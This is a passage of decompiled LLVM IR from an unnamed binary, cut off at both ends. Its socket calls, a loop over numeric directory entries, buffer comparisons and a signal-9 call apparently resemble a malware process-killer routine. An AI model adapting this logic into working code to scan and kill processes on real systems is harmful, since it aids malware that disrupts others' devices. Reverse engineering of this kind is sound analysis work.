  %v1_e1d8 = call i32 @function_14898(i32 23)
  store i32 %v2_e1b8, i32* %r3.global-to-local, align 4
  %v0_e1ec = load i32, i32* @r5, align 4
  store i32 %v0_e1ec, i32* %r2.global-to-local, align 4
  %v3_e1f0 = call i32 @function_14ba0(i32 2, i32 1, i32 %v0_e1ec)
  %v7_e1f4 = icmp eq i32 %v3_e1f0, -1
  store i32 %v3_e1f0, i32* @r4, align 4
  br i1 %v7_e1f4, label %dec_label_pc_e21c, label %dec_label_pc_e200

dec_label_pc_e200:                                ; preds = %dec_label_pc_e1b8
  %v2_e204 = ptrtoint i32* %stack_var_-76 to i32
  store i32 16, i32* @r2, align 4
  %v3_e20c = call i32 @function_147bc(i32 %v3_e1f0, i32 %v2_e204, i32 16)
  %v0_e210 = load i32, i32* @r4, align 4
  store i32 %v0_e210, i32* @r0, align 4
  %v2_e218 = call i32 @function_149f4(i32 %v0_e210, i32 1)
  br label %dec_label_pc_e21c

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e1b8, %dec_label_pc_e200
  %v1_e220 = call i32 @function_14898(i32 22)
  %v1_e224 = call i32 @function_dc00(i32 %v1_e220)
  %v1_e22c = call i32 @function_14898(i32 22)
  %v0_e238 = load i32, i32* @r5, align 4
  store i32 %v0_e238, i32* %r2.global-to-local, align 4
  %v3_e244 = call i32 @function_14ba0(i32 2, i32 1, i32 %v0_e238)
  %v7_e248 = icmp eq i32 %v3_e244, -1
  store i32 %v3_e244, i32* @r4, align 4
  br i1 %v7_e248, label %dec_label_pc_e270, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e21c
  %v2_e258 = ptrtoint i32* %stack_var_-76 to i32
  store i32 16, i32* @r2, align 4
  %v3_e260 = call i32 @function_147bc(i32 %v3_e244, i32 %v2_e258, i32 16)
  %v0_e264 = load i32, i32* @r4, align 4
  store i32 %v0_e264, i32* @r0, align 4
  %v2_e26c = call i32 @function_149f4(i32 %v0_e264, i32 1)
  br label %dec_label_pc_e270

dec_label_pc_e270:                                ; preds = %dec_label_pc_e21c, %dec_label_pc_e254
  %v1_e274 = call i32 @function_15c58(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e27c = call i32 @function_13cc8()
  store i32 ptrtoint (i32* @global_var_2239c.107 to i32), i32* %r3.global-to-local, align 4
  store i32 %v0_e27c, i32* %r2.global-to-local, align 4
  %v0_e288 = load i32, i32* @r5, align 4
  %v1_e288 = trunc i32 %v0_e288 to i8
  %v3_e288 = inttoptr i32 %v0_e27c to i8*
  store i8 %v1_e288, i8* %v3_e288, align 1
  %v0_e28c = load i32, i32* @r5, align 4
  %v1_e28c = load i32, i32* %r3.global-to-local, align 4
  %v2_e28c = inttoptr i32 %v1_e28c to i32*
  store i32 %v0_e28c, i32* %v2_e28c, align 4
  store i32 ptrtoint (i32* @global_var_22960.109 to i32), i32* %r3.global-to-local, align 4
  %v0_e298 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e298, i32* @global_var_22960.109, align 4
  %v1_e29c = call i32 @function_11ad8(i32 6)
  %v1_e2a4 = call i32 @function_11ad8(i32 7)
  %v2_e2ac = ptrtoint i32* %stack_var_-4264 to i32
  %v0_e2b4 = load i32, i32* @r5, align 4
  %v2_e2bc = inttoptr i32 %v0_e2b4 to i32*
  %v3_e2bc = call i32 @function_11a14(i32 6, i32* %v2_e2bc)
  %v1_e2c4 = add i32 %v2_e2ac, -52
  store i32 %v1_e2c4, i32* %r2.global-to-local, align 4
  store i32 %v1_e2c4, i32* @r0, align 4
  %v2_e2d4 = inttoptr i32 %v1_e2c4 to i8*
  %v3_e2d4 = call i32 @function_12398(i8* %v2_e2d4, i32 %v3_e2bc)
  store i32 %v3_e2d4, i32* @r0, align 4
  store i32 %v1_e2c4, i32* %r3.global-to-local, align 4
  %v2_e2dc = add i32 %v3_e2d4, %v1_e2c4
  store i32 %v2_e2dc, i32* @r4, align 4
  %v1_e2e0 = call i32 @function_15bc0(i32 %v3_e2d4)
  %v2_e2e8 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_e2e8, i32* %r2.global-to-local, align 4
  %v3_e2f0 = trunc i32 %v1_e2e0 to i8
  %v4_e2f0 = call i32 @function_12870(i8 %v3_e2f0, i32 10, i32 %v2_e2e8)
  %v0_e2f8 = load i32, i32* @r4, align 4
  store i32 %v0_e2f8, i32* @r0, align 4
  %v2_e2fc = inttoptr i32 %v0_e2f8 to i8*
  %v3_e2fc = call i32 @function_12398(i8* %v2_e2fc, i32 %v4_e2f0)
  %v0_e300 = load i32, i32* @r5, align 4
  %v1_e304 = load i32, i32* @r4, align 4
  %v2_e304 = add i32 %v1_e304, %v3_e2fc
  store i32 %v2_e304, i32* @r4, align 4
  %v2_e30c = inttoptr i32 %v0_e300 to i32*
  %v3_e30c = call i32 @function_11a14(i32 7, i32* %v2_e30c)
  %v0_e314 = load i32, i32* @r4, align 4
  store i32 %v0_e314, i32* @r0, align 4
  %v2_e318 = inttoptr i32 %v0_e314 to i8*
  %v3_e318 = call i32 @function_12398(i8* %v2_e318, i32 %v3_e30c)
  %v0_e31c = load i32, i32* @r5, align 4
  store i32 %v3_e318, i32* @r6, align 4
  %v2_e328 = call i32 @function_1312c(i32 %v1_e2c4, i32 %v0_e31c)
  store i32 %v2_e328, i32* @r0, align 4
  %v7_e32c = icmp eq i32 %v2_e328, -1
  br i1 %v7_e32c, label %dec_label_pc_e1a8, label %dec_label_pc_e334

dec_label_pc_e334:                                ; preds = %dec_label_pc_e270
  %v1_e334 = call i32 @function_15b6c(i32 %v2_e328)
  %v1_e33c = call i32 @function_11a38(i32 6)
  %v1_e344 = call i32 @function_11a38(i32 7)
  store i32 ptrtoint (i32* @global_var_22960.109 to i32), i32* %r3.global-to-local, align 4
  %v2_e350 = load i32, i32* @global_var_22960.109, align 4
  store i32 4095, i32* @r2, align 4
  store i32 %v1_e2c4, i32* @r0, align 4
  %v3_e35c = call i32 @function_15c28(i32 %v1_e2c4, i32 %v2_e350, i32 4095)
  %v7_e360 = icmp eq i32 %v3_e35c, -1
  br i1 %v7_e360, label %.thread9, label %bb223

bb223:                                            ; preds = %dec_label_pc_e334
  %v3_e368 = load i32, i32* @global_var_22960.109, align 4
  store i32 %v3_e368, i32* %r3.global-to-local, align 4
  %v1_e36c = load i32, i32* @r5, align 4
  %v2_e36c = trunc i32 %v1_e36c to i8
  %v5_e36c = add i32 %v3_e368, %v3_e35c
  %v6_e36c = inttoptr i32 %v5_e36c to i8*
  store i8 %v2_e36c, i8* %v6_e36c, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_e334, %bb223
  store i32 %v1_e2c4, i32* %r2.global-to-local, align 4
  %v0_e374 = load i32, i32* @r6, align 4
  %v1_e374 = load i32, i32* @r4, align 4
  %v1_e2c4.neg = sub i32 52, %v2_e2ac
  %v2_e374 = add i32 %v1_e2c4.neg, %v0_e374
  %v2_e378 = add i32 %v2_e374, %v1_e374
  %v2_e380 = call i32 @function_12404(i32 %v1_e2c4, i32 %v2_e378)
  %v0_e384 = load i32, i32* @r7, align 4
  store i32 %v0_e384, i32* @r4, align 4
  %v0_e388 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_e494 = ptrtoint i32* %stack_var_-156 to i32
  %v2_e498 = bitcast i32* %stack_var_-156 to i8*
  %v2_e4e4 = ptrtoint i32* %stack_var_-220 to i32
  %v2_e4e8 = bitcast i32* %stack_var_-220 to i8*
  %v2_e6b4 = ptrtoint i32* %stack_var_-8412 to i32
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %dec_label_pc_e458, %.thread9
  %stack_var_-8428.0 = phi i32 [ %v0_e388, %.thread9 ], [ %stack_var_-8428.3, %dec_label_pc_e458 ]
  %v1_e394 = call i32 @function_11ad8(i32 6)
  %v3_e3a0 = call i32 @function_11a14(i32 6, i32* null)
  store i32 %v3_e3a0, i32* @r0, align 4
  %v1_e3a4 = call i32 @function_12c08(i32 %v3_e3a0)
  store i32 %v1_e3a4, i32* @r8, align 4
  %v2_e3a8 = icmp eq i32 %v1_e3a4, 0
  br i1 %v2_e3a8, label %dec_label_pc_e1a8, label %dec_label_pc_e3b0

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e390
  %v1_e3b4 = call i32 @function_11a38(i32 6)
  %v0_e3b8119 = load i32, i32* @r8, align 4
  %v1_e3bc120 = inttoptr i32 %v0_e3b8119 to i32*
  %v2_e3bc121 = call i32 @function_12c54(i32* %v1_e3bc120)
  %v2_e3c0123 = icmp eq i32 %v2_e3bc121, 0
  br i1 %v2_e3c0123, label %dec_label_pc_e458, label %dec_label_pc_e3c8.preheader

dec_label_pc_e3c8.preheader:                      ; preds = %dec_label_pc_e3b0, %dec_label_pc_e3b8.backedge
  %v0_e3c8134 = phi i32 [ %v2_e3bc, %dec_label_pc_e3b8.backedge ], [ %v2_e3bc121, %dec_label_pc_e3b0 ]
  %stack_var_-8428.1124 = phi i32 [ %stack_var_-8428.1.be, %dec_label_pc_e3b8.backedge ], [ %stack_var_-8428.0, %dec_label_pc_e3b0 ]
  br label %dec_label_pc_e3c8

dec_label_pc_e3c8:                                ; preds = %dec_label_pc_e3c8.preheader, %dec_label_pc_e440
  %v0_e3d8 = phi i32 [ %v2_e44c, %dec_label_pc_e440 ], [ %v0_e3c8134, %dec_label_pc_e3c8.preheader ]
  %stack_var_-8428.2 = phi i32 [ %v1_e3ec, %dec_label_pc_e440 ], [ %stack_var_-8428.1124, %dec_label_pc_e3c8.preheader ]
  %v1_e3c8 = add i32 %v0_e3d8, 19
  %v2_e3c8 = inttoptr i32 %v1_e3c8 to i8*
  %v3_e3c8 = load i8, i8* %v2_e3c8, align 1
  %v4_e3c8 = zext i8 %v3_e3c8 to i32
  %v1_e3cc = add nsw i32 %v4_e3c8, -48
  store i32 %v1_e3cc, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e3cc, 9
  br i1 %tmp, label %dec_label_pc_e3b8.backedge, label %dec_label_pc_e3d8

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e3c8
  store i32 %v1_e3c8, i32* @r6, align 4
  store i32 %v1_e3c8, i32* @r0, align 4
  %v1_e3e0 = call i32 @function_14f84(i32 %v1_e3c8)
  %v0_e3e8 = load i32, i32* @r5, align 4
  %v1_e3ec = add i32 %stack_var_-8428.2, 1
  store i32 %v1_e3ec, i32* %r3.global-to-local, align 4
  store i32 %v1_e3e0, i32* @r7, align 4
  %v5_e3f8 = icmp slt i32 %v0_e3e8, %v1_e3e0
  %v2_e468 = call i32 @function_15b1c(i32* null)
  br i1 %v5_e3f8, label %dec_label_pc_e464, label %dec_label_pc_e3fc

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3d8
  %v0_e404 = load i32, i32* @r4, align 4
  %v2_e404 = sub i32 %v2_e468, %v0_e404
  %v7_e40c = icmp slt i32 %v2_e404, 601
  br i1 %v7_e40c, label %dec_label_pc_e414, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_e3fc
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_e3b8.backedge

dec_label_pc_e414:                                ; preds = %dec_label_pc_e3fc
  %v0_e414 = load i32, i32* @r7, align 4
  %v7_e418 = icmp slt i32 %v0_e414, 401
  br i1 %v7_e418, label %dec_label_pc_e3b8.backedge, label %dec_label_pc_e41c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e414
  %v3_e424 = zext i32 %v1_e3ec to i64
  %v4_e424 = mul nuw i64 %v3_e424, 3435973837
  %v3_e4281 = udiv i64 %v4_e424, 34359738368
  %v3_e42c3 = mul nuw nsw i64 %v3_e4281, 8
  %v3_e42c = trunc i64 %v3_e42c3 to i32
  store i32 %v3_e42c, i32* %r3.global-to-local, align 4
  %v2_e4305 = mul nuw nsw i64 %v3_e4281, 2
  %v2_e430 = trunc i64 %v2_e4305 to i32
  %v2_e434 = add i32 %v3_e42c, %v2_e430
  store i32 %v2_e434, i32* %r2.global-to-local, align 4
  %v9_e438 = icmp eq i32 %v1_e3ec, %v2_e434
  br i1 %v9_e438, label %dec_label_pc_e440, label %dec_label_pc_e3b8.backedge

dec_label_pc_e440:                                ; preds = %dec_label_pc_e41c
  %v1_e444 = call i32 @function_15c58(i32 1)
  %v0_e448 = load i32, i32* @r8, align 4
  %v1_e44c = inttoptr i32 %v0_e448 to i32*
  %v2_e44c = call i32 @function_12c54(i32* %v1_e44c)
  %v2_e450 = icmp eq i32 %v2_e44c, 0
  br i1 %v2_e450, label %dec_label_pc_e458, label %dec_label_pc_e3c8

dec_label_pc_e458:                                ; preds = %dec_label_pc_e3b8.backedge, %dec_label_pc_e440, %dec_label_pc_e3b0
  %stack_var_-8428.3 = phi i32 [ %stack_var_-8428.0, %dec_label_pc_e3b0 ], [ %v1_e3ec, %dec_label_pc_e440 ], [ %stack_var_-8428.1.be, %dec_label_pc_e3b8.backedge ]
  %v0_e458 = load i32, i32* @r8, align 4
  %v1_e45c = inttoptr i32 %v0_e458 to i32*
  %v2_e45c = call i32 @function_12bd8(i32* %v1_e45c)
  br label %dec_label_pc_e390

dec_label_pc_e464:                                ; preds = %dec_label_pc_e3d8
  %v1_e474 = call i32 @function_11ad8(i32 6)
  %v1_e47c = call i32 @function_11ad8(i32 7)
  %v3_e488 = call i32 @function_11a14(i32 6, i32* null)
  store i32 %v2_e494, i32* @r0, align 4
  %v3_e498 = call i32 @function_12398(i8* %v2_e498, i32 %v3_e488)
  store i32 %v2_e494, i32* %r2.global-to-local, align 4
  %v2_e4a4 = add i32 %v3_e498, %v2_e494
  %v0_e4a8 = load i32, i32* @r6, align 4
  store i32 %v2_e4a4, i32* @r0, align 4
  %v2_e4b0 = inttoptr i32 %v2_e4a4 to i8*
  %v3_e4b0 = call i32 @function_12398(i8* %v2_e4b0, i32 %v0_e4a8)
  %v3_e4c0 = call i32 @function_11a14(i32 7, i32* null)
  %v2_e4c8 = add i32 %v2_e4a4, %v3_e4b0
  store i32 %v2_e4c8, i32* @r0, align 4
  %v2_e4cc = inttoptr i32 %v2_e4c8 to i8*
  %v3_e4cc = call i32 @function_12398(i8* %v2_e4cc, i32 %v3_e4c0)
  %v3_e4d8 = call i32 @function_11a14(i32 6, i32* null)
  store i32 %v2_e4e4, i32* @r0, align 4
  %v3_e4e8 = call i32 @function_12398(i8* %v2_e4e8, i32 %v3_e4d8)
  store i32 %v2_e4e4, i32* %r3.global-to-local, align 4
  %v2_e4f4 = add i32 %v3_e4e8, %v2_e4e4
  store i32 %v2_e4f4, i32* @r5, align 4
  %v0_e4f8 = load i32, i32* @r6, align 4
  store i32 %v2_e4f4, i32* @r0, align 4
  %v2_e500 = inttoptr i32 %v2_e4f4 to i8*
  %v3_e500 = call i32 @function_12398(i8* %v2_e500, i32 %v0_e4f8)
  store i32 %v3_e500, i32* @r4, align 4
  %v3_e510 = call i32 @function_11a14(i32 11, i32* null)
  %v0_e518 = load i32, i32* @r4, align 4
  %v1_e518 = load i32, i32* @r5, align 4
  %v2_e518 = add i32 %v1_e518, %v0_e518
  store i32 %v2_e518, i32* @r0, align 4
  %v2_e51c = inttoptr i32 %v2_e518 to i8*
  %v3_e51c = call i32 @function_12398(i8* %v2_e51c, i32 %v3_e510)
  %v1_e524 = call i32 @function_11a38(i32 6)
  %v1_e52c = call i32 @function_11a38(i32 7)
  store i32 %v2_e494, i32* @r0, align 4
  store i32 4095, i32* @r2, align 4
  %v3_e544 = call i32 @function_15c28(i32 %v2_e494, i32 %v1_e2c4, i32 4095)
  %v7_e548 = icmp eq i32 %v3_e544, -1
  store i32 %v3_e544, i32* @r5, align 4
  br i1 %v7_e548, label %dec_label_pc_e60c, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e464
  store i32 0, i32* @r4, align 4
  %v4_e560 = add i32 %v3_e544, %v1_e2c4
  %v5_e560 = inttoptr i32 %v4_e560 to i8*
  store i8 0, i8* %v5_e560, align 1
  %v1_e564 = call i32 @function_11ad8(i32 10)
  %v0_e568 = load i32, i32* @r4, align 4
  %v2_e570 = inttoptr i32 %v0_e568 to i32*
  %v3_e570 = call i32 @function_11a14(i32 10, i32* %v2_e570)
  %v0_e574 = load i32, i32* @r5, align 4
  %v1_e574 = add i32 %v0_e574, -1
  store i32 %v1_e574, i32* @r1, align 4
  store i32 %v3_e570, i32* %r2.global-to-local, align 4
  %v4_e580 = call i32 @function_126cc(i8* %v2_e2d4, i32 %v1_e574, i32 %v3_e570)
  %v7_e584 = icmp eq i32 %v4_e580, -1
  br i1 %v7_e584, label %dec_label_pc_e5a0, label %dec_label_pc_e58c

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e554
  store i32 %v1_e2c4, i32* @r0, align 4
  %v1_e590 = call i32 @function_15c8c(i32 %v1_e2c4)
  %v0_e594 = load i32, i32* @r7, align 4
  store i32 %v0_e594, i32* @r0, align 4
  %v2_e59c = call i32 @function_14e24(i32 %v0_e594, i32 9)
  br label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %dec_label_pc_e554, %dec_label_pc_e58c
  %v1_e5a4 = call i32 @function_11a38(i32 10)
  store i32 %v1_e5a4, i32* @r0, align 4
  %v1_e5a8 = call i32 @function_15bc0(i32 %v1_e5a4)
  store i32 %v1_e5a8, i32* @r0, align 4
  %v0_e5ac = load i32, i32* @r7, align 4
  %v9_e5ac = icmp eq i32 %v0_e5ac, %v1_e5a8
  br i1 %v9_e5ac, label %dec_label_pc_e5d8, label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e5a0
  %v0_e5b4 = call i32 @function_15bd4()
  %v0_e5b8 = load i32, i32* @r7, align 4
  %v9_e5b8 = icmp eq i32 %v0_e5b8, %v0_e5b4
  br i1 %v9_e5b8, label %dec_label_pc_e5d8, label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e5b4
  store i32 ptrtoint (i32* @global_var_22960.109 to i32), i32* %r2.global-to-local, align 4
  %v2_e5c8 = load i32, i32* @global_var_22960.109, align 4
  %v3_e5cc = call i32 @function_1275c(i8* %v2_e2d4, i32 %v2_e5c8)
  %v2_e5d0 = icmp eq i32 %v3_e5cc, 0
  br i1 %v2_e5d0, label %dec_label_pc_e5e4, label %dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge

dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge:    ; preds = %dec_label_pc_e5c0
  %v0_e5dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e5d8

dec_label_pc_e5d8:                                ; preds = %dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge, %dec_label_pc_e5b4, %dec_label_pc_e5a0
  %v0_e5dc = phi i32 [ %v0_e5dc.pre, %dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge ], [ %v0_e5b4, %dec_label_pc_e5b4 ], [ %v1_e5a8, %dec_label_pc_e5a0 ]
  store i32 %v2_e468, i32* @r4, align 4
  store i32 %v0_e5dc, i32* @r5, align 4
  br label %dec_label_pc_e3b8.backedge

dec_label_pc_e3b8.backedge:                       ; preds = %dec_label_pc_e41c, %dec_label_pc_e414, %dec_label_pc_e3c8, %dec_label_pc_e5d8, %dec_label_pc_e898, %.thread10
  %stack_var_-8428.1.be = phi i32 [ %v1_e3ec, %dec_label_pc_e898 ], [ %v1_e3ec, %dec_label_pc_e5d8 ], [ %v1_e3ec, %.thread10 ], [ %stack_var_-8428.2, %dec_label_pc_e3c8 ], [ %v1_e3ec, %dec_label_pc_e414 ], [ %v1_e3ec, %dec_label_pc_e41c ]
  %v0_e3b8 = load i32, i32* @r8, align 4
  %v1_e3bc = inttoptr i32 %v0_e3b8 to i32*
  %v2_e3bc = call i32 @function_12c54(i32* %v1_e3bc)
  %v2_e3c0 = icmp eq i32 %v2_e3bc, 0
  br i1 %v2_e3c0, label %dec_label_pc_e458, label %dec_label_pc_e3c8.preheader

dec_label_pc_e5e4:                                ; preds = %dec_label_pc_e5c0
  %v2_e5ec = call i32 @function_1312c(i32 %v1_e2c4, i32 0)
  %v7_e5f0 = icmp eq i32 %v2_e5ec, -1
  store i32 %v2_e5ec, i32* @r4, align 4
  br i1 %v7_e5f0, label %bb224, label %.thread12

bb224:                                            ; preds = %dec_label_pc_e5e4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e5e4, %bb224
  store i32 ptrtoint (i32* @global_var_e604.112 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_e5f0, i32 ptrtoint (i32* @global_var_14e24.111 to i32))
  %v0_e604 = load i32, i32* @r4, align 4
  store i32 %v0_e604, i32* @r0, align 4
  %v1_e608 = call i32 @function_15b6c(i32 %v0_e604)
  br label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e464, %.thread12
  %v2_e618 = call i32 @function_1312c(i32 %v2_e494, i32 0)
  %v7_e61c = icmp eq i32 %v2_e618, -1
  br i1 %v7_e61c, label %dec_label_pc_e898, label %dec_label_pc_e628

dec_label_pc_e628:                                ; preds = %dec_label_pc_e60c
  %v1_e62c = call i32 @function_11ad8(i32 12)
  %v1_e634 = call i32 @function_11ad8(i32 13)
  %v1_e63c = call i32 @function_11ad8(i32 14)
  %v1_e644 = call i32 @function_11ad8(i32 15)
  %v1_e64c = call i32 @function_11ad8(i32 16)
  %v3_e65c = call i32 @function_11a14(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v3_e65c, i32* @r6, align 4
  %v3_e670 = call i32 @function_11a14(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v3_e670, i32* @sl, align 4
  %v3_e684 = call i32 @function_11a14(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v3_e684, i32* @sb, align 4
  %v3_e694 = call i32 @function_11a14(i32 15, i32* nonnull %stack_var_-56)
  store i32 %v3_e694, i32* @fp, align 4
  %v3_e6a8 = call i32 @function_11a14(i32 16, i32* nonnull %stack_var_-60)
  store i32 %v2_e6b4, i32* @r4, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v3_e6c4116 = call i32 @function_15be8(i32 %v2_e618, i32 %v2_e6b4, i32 4096)
  %tmp225 = icmp slt i32 %v3_e6c4116, 1
  br i1 %tmp225, label %dec_label_pc_e8cc, label %dec_label_pc_e6d0

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e628, %dec_label_pc_e6b8.backedge
  %v0_e758107 = phi i32 [ %v3_e6c4, %dec_label_pc_e6b8.backedge ], [ %v3_e6c4116, %dec_label_pc_e628 ]
  store i32 %v2_e1b8, i32* %r3.global-to-local, align 4
  %v3_e6d4 = load i32, i32* %stack_var_-44, align 4
  %v5_e6dc = icmp slt i32 %v0_e758107, %v3_e6d4
  br i1 %v5_e6dc, label %dec_label_pc_e6ec, label %dec_label_pc_e798.lr.ph

dec_label_pc_e798.lr.ph:                          ; preds = %dec_label_pc_e6d0
  %v0_e798.pre = load i32, i32* @r6, align 4
  %v1_e79c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e798

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e790.backedge, %dec_label_pc_e6d0
  %v3_e6f0 = load i32, i32* %stack_var_-48, align 4
  %v5_e6f8 = icmp slt i32 %v0_e758107, %v3_e6f0
  br i1 %v5_e6f8, label %dec_label_pc_e708, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_e6ec
  %v2_e7c482 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e7c482, label %dec_label_pc_e708, label %dec_label_pc_e7cc.lr.ph

dec_label_pc_e7cc.lr.ph:                          ; preds = %.thread28
  %v0_e7cc.pre = load i32, i32* @sl, align 4
  %v1_e7d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e7cc

dec_label_pc_e708:                                ; preds = %dec_label_pc_e7c4.backedge, %.thread28, %dec_label_pc_e6ec
  store i32 %v2_e1b8, i32* %r2.global-to-local, align 4
  %v3_e70c = load i32, i32* %stack_var_-52, align 4
  %v5_e714 = icmp slt i32 %v0_e758107, %v3_e70c
  br i1 %v5_e714, label %dec_label_pc_e724, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_e708
  %v2_e7f891 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e7f891, label %dec_label_pc_e724, label %dec_label_pc_e800.lr.ph

dec_label_pc_e800.lr.ph:                          ; preds = %.thread37
  %v0_e800.pre = load i32, i32* @sb, align 4
  %v1_e804.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e800

dec_label_pc_e724:                                ; preds = %dec_label_pc_e7f8.backedge, %.thread37, %dec_label_pc_e708
  store i32 %v2_e1b8, i32* %r3.global-to-local, align 4
  %v3_e728 = load i32, i32* %stack_var_-56, align 4
  %v5_e730 = icmp slt i32 %v0_e758107, %v3_e728
  br i1 %v5_e730, label %dec_label_pc_e740, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_e724
  %v2_e82c100 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e82c100, label %dec_label_pc_e740, label %dec_label_pc_e834.lr.ph

dec_label_pc_e834.lr.ph:                          ; preds = %.thread46
  %v0_e834.pre = load i32, i32* @fp, align 4
  %v1_e838.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e834

dec_label_pc_e740:                                ; preds = %dec_label_pc_e82c.backedge, %.thread46, %dec_label_pc_e724
  %v3_e744 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e744, i32* @lr, align 4
  %v5_e74c = icmp slt i32 %v0_e758107, %v3_e744
  br i1 %v5_e74c, label %dec_label_pc_e6b8.backedge, label %.thread52

dec_label_pc_e6b8.backedge:                       ; preds = %dec_label_pc_e778, %.thread52, %dec_label_pc_e740
  store i32 4096, i32* %r2.global-to-local, align 4
  %v3_e6c4 = call i32 @function_15be8(i32 %v2_e618, i32 %v2_e6b4, i32 4096)
  %tmp226 = icmp slt i32 %v3_e6c4, 1
  br i1 %tmp226, label %dec_label_pc_e8cc, label %dec_label_pc_e6d0

.thread52:                                        ; preds = %dec_label_pc_e740
  %v2_e758109 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e758109, label %dec_label_pc_e6b8.backedge, label %dec_label_pc_e760.lr.ph

dec_label_pc_e760.lr.ph:                          ; preds = %.thread52
  %v1_e768.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e760

dec_label_pc_e760:                                ; preds = %dec_label_pc_e778, %dec_label_pc_e760.lr.ph
  %v0_e758.in = phi i32 [ %v0_e758107, %dec_label_pc_e760.lr.ph ], [ %v0_e758, %dec_label_pc_e778 ]
  %v0_e778 = phi i32 [ 0, %dec_label_pc_e760.lr.ph ], [ %v1_e778, %dec_label_pc_e778 ]
  %v1_e764 = phi i32 [ 0, %dec_label_pc_e760.lr.ph ], [ %v1_e764174, %dec_label_pc_e778 ]
  %v0_e758 = add i32 %v0_e758.in, -1
  store i32 %v3_e6a8, i32* %r3.global-to-local, align 4
  %v2_e764 = add i32 %v1_e764, %v3_e6a8
  %v3_e764 = inttoptr i32 %v2_e764 to i8*
  %v4_e764 = load i8, i8* %v3_e764, align 1
  %v6_e764 = zext i8 %v4_e764 to i32
  store i32 %v6_e764, i32* %r2.global-to-local, align 4
  %v2_e768 = add i32 %v0_e778, %v1_e768.pre
  %v3_e768 = inttoptr i32 %v2_e768 to i8*
  %v4_e768 = load i8, i8* %v3_e768, align 1
  %v6_e768 = zext i8 %v4_e768 to i32
  store i32 %v6_e768, i32* %r3.global-to-local, align 4
  %v9_e76c = icmp eq i8 %v4_e768, %v4_e764
  br i1 %v9_e76c, label %dec_label_pc_e850, label %bb227

bb227:                                            ; preds = %dec_label_pc_e760
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %bb227, %dec_label_pc_e850
  %v1_e764174 = phi i32 [ %v1_e850, %dec_label_pc_e850 ], [ 0, %bb227 ]
  %v1_e778 = add i32 %v0_e778, 1
  %v2_e758 = icmp eq i32 %v0_e758, 0
  br i1 %v2_e758, label %dec_label_pc_e6b8.backedge, label %dec_label_pc_e760

dec_label_pc_e780:                                ; preds = %dec_label_pc_e798
  %v1_e780 = add i32 %v1_e798, 1
  store i32 %v1_e780, i32* @lr, align 4
  %v9_e784 = icmp eq i32 %v3_e6d4, %v1_e780
  br i1 %v9_e784, label %dec_label_pc_e85c, label %dec_label_pc_e790.backedge

dec_label_pc_e790.backedge:                       ; preds = %dec_label_pc_e780, %dec_label_pc_e7ac
  %v1_e798139 = phi i32 [ 0, %dec_label_pc_e7ac ], [ %v1_e780, %dec_label_pc_e780 ]
  %storemerge127 = add i32 %storemerge127.in, 1
  %v2_e790 = icmp eq i32 %v0_e790, 0
  br i1 %v2_e790, label %dec_label_pc_e6ec, label %dec_label_pc_e798

dec_label_pc_e798:                                ; preds = %dec_label_pc_e790.backedge, %dec_label_pc_e798.lr.ph
  %v0_e790.in = phi i32 [ %v0_e758107, %dec_label_pc_e798.lr.ph ], [ %v0_e790, %dec_label_pc_e790.backedge ]
  %storemerge127.in = phi i32 [ 0, %dec_label_pc_e798.lr.ph ], [ %storemerge127, %dec_label_pc_e790.backedge ]
  %v1_e798 = phi i32 [ 0, %dec_label_pc_e798.lr.ph ], [ %v1_e798139, %dec_label_pc_e790.backedge ]
  %v0_e790 = add i32 %v0_e790.in, -1
  %v2_e798 = add i32 %v1_e798, %v0_e798.pre
  %v3_e798 = inttoptr i32 %v2_e798 to i8*
  %v4_e798 = load i8, i8* %v3_e798, align 1
  %v6_e798 = zext i8 %v4_e798 to i32
  store i32 %v6_e798, i32* %r2.global-to-local, align 4
  %v2_e79c = add i32 %storemerge127.in, %v1_e79c.pre
